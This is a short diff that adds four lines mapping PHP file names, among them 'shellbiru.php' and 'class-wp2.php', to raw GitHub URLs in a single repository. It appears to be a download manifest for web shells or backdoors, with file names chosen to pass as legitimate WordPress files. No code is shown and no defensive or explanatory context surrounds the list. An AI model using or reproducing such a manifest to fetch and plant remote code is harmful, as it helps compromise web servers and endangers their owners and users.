@@ -1,0 +1,4 @@
+handler.php => https://raw.githubusercontent.com/tryxapp/excon/refs/heads/main/newcon1/newcon2/oncon/handler.php
+class-wp2.php => https://raw.githubusercontent.com/tryxapp/excon/refs/heads/main/newcon1/newcon2/oncon/class-wp2.php
+minfo.php => https://raw.githubusercontent.com/tryxapp/excon/refs/heads/main/newcon1/newcon2/oncon/Minfo.php
+shellbiru.php => https://raw.githubusercontent.com/tryxapp/excon/refs/heads/main/newcon1/newcon2/oncon/shellbiru.php
